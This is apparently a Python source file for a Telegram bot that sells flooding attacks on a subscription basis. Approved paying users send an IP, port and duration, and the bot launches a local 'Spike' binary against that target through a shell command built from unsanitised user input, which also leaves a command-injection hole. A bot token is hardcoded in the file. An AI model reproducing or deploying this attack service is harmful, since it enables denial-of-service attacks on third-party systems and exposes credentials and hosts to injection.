import os
import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError
import time

TELEGRAM_BOT_TOKEN = '7351069485:AAHSkECPcRrapcC7L-q1cy1g2Udoj4bXrnA'
ADMIN_USER_ID = 6484008134  # Admin Telegram ID for approving/disapproving users
bot_access_free = False  # Bot access is restricted
bot_busy = False  # Track if the bot is busy with an attack
remaining_time = 0  # Track remaining time for ongoing attack
approved_users = {}  # Dictionary to store approved users and their plan expiration

# Function to check and remove expired users
def check_expired_users():
    global approved_users
    current_time = datetime.now()
    expired_users = [user_id for user_id, user_data in approved_users.items() if user_data['expiry_date'] < current_time]
    
    for user_id in expired_users:
        del approved_users[user_id]

# Check for expired users when bot starts
check_expired_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if user_id not in approved_users:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You are not approved. Please DM @drabbyt for approval.*",
            parse_mode='Markdown'
        )
        return

    # Check if the user's plan is expired
    if approved_users[user_id]['expiry_date'] < datetime.now():
        del approved_users[user_id]  # Remove expired users from approved list
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Your plan has expired. You have been removed from the approved list.*",
            parse_mode='Markdown'
        )
        return

    # Approved user welcome message
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global bot_busy, remaining_time
    bot_busy = True
    remaining_time = int(duration)

    try:
        process = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 512 160",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Display countdown in remaining_time
        while remaining_time > 0:
            await asyncio.sleep(1)
            remaining_time -= 1

        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        bot_busy = False
        remaining_time = 0
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global bot_busy, remaining_time
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if user_id not in approved_users:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You are not authorized to use this bot! Please DM @drabbyt for approval.*",
            parse_mode='Markdown'
        )
        return

    # Check if the user's plan is expired
    if approved_users[user_id]['expiry_date'] < datetime.now():
        del approved_users[user_id]
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Your plan has expired. You have been removed from the approved list.*",
            parse_mode='Markdown'
        )
        return

    # Check if the bot is already busy with an attack
    if bot_busy:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⏳ Please wait, bot is busy with another attack! ⏳*\n*🕒 Remaining time: {remaining_time} seconds*",
            parse_mode='Markdown'
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can approve users
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to approve users.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id> <plan> <days>*", parse_mode='Markdown')
        return

    customer_id, plan, days = int(args[0]), args[1], int(args[2])
    expiry_date = datetime.now() + timedelta(days=days)
    approved_users[customer_id] = {"plan": plan, "expiry_date": expiry_date}

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*✅ User {customer_id} approved with plan '{plan}' for {days} days.*",
        parse_mode='Markdown'
    )

async def disapprove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Only the admin can disapprove users
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to disapprove users.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /disapprove <user_id>*", parse_mode='Markdown')
        return

    customer_id = int(args[0])
    if customer_id in approved_users:
        del approved_users[customer_id]
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ User {customer_id} has been disapproved.*",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ User not found in approved list.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("disapprove", disapprove))

    application.run_polling()

if __name__ == '__main__':
    main()
